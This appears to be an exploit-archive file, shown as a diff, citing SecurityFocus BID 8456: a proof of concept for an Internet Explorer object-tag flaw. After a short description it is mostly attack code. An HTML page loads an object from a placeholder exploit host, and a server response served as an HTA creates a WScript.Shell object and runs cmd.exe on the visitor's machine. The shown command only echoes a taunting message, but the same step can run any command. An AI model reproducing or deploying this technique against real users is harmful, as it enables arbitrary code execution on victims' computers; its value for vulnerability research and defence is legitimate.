@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/8456/info
+
+The problem occurs when Internet Explorer receives a response from the server when a web page containing an object tag is parsed. Successful exploitation of this vulnerability could allow a malicious object to be trusted and as such be executed on the local system. All code execution would occur in the security context of the current user. 
+
+--------------Client HTTP request---------------------------
+<html>
+...
+<object data="www.yourinternethost.com/yourexploitwebpageorcgi.html">
+</object>
+</html>
+------------------------------------------------------------
+
+-------------Server HTTP Response---------------------------
+HTTP/1.1 200 OK
+Date: Tue, 13 May 2003 18:06:43 GMT
+Server: Apache
+Content-Type: application/hta
+Content-Length: 191
+
+<html>
+<object id='wsh'
+classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
+<script>
+wsh.Run("cmD.exe /k echO so loNg, and ThaNks For all yoUr EmplOyeeS");
+</script>
+</html>
+------------------------------------------------------------ 
